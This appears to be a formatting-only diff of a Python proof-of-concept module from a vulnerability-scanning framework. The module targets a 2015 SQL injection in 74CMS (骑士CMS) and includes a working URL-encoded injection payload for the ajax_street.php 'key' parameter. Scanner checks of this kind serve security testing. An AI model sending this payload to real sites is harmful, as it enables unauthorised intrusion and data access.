@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 
+
 class Vuln(ABVuln):
-    vuln_id = '74CMS_0014' # 平台漏洞编号，留空
+    vuln_id = '74CMS_0014'  # 平台漏洞编号，留空
     name = '骑士CMS SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-10-13'  # 漏洞公布时间
     desc = '''
         /plus/ajax_street.php?act=key&key= 出现SQL注入漏洞。
@@ -32,7 +33,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             payload = '/plus/ajax_street.php?act=key&key=%E5%BB%BA%E8%AE%BE%%27%20and%20c_name%20like%20%27%%E5%BB%BA%E8%AE%BE'
             url = self.target + payload
             r = requests.get(url)
@@ -46,6 +47,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
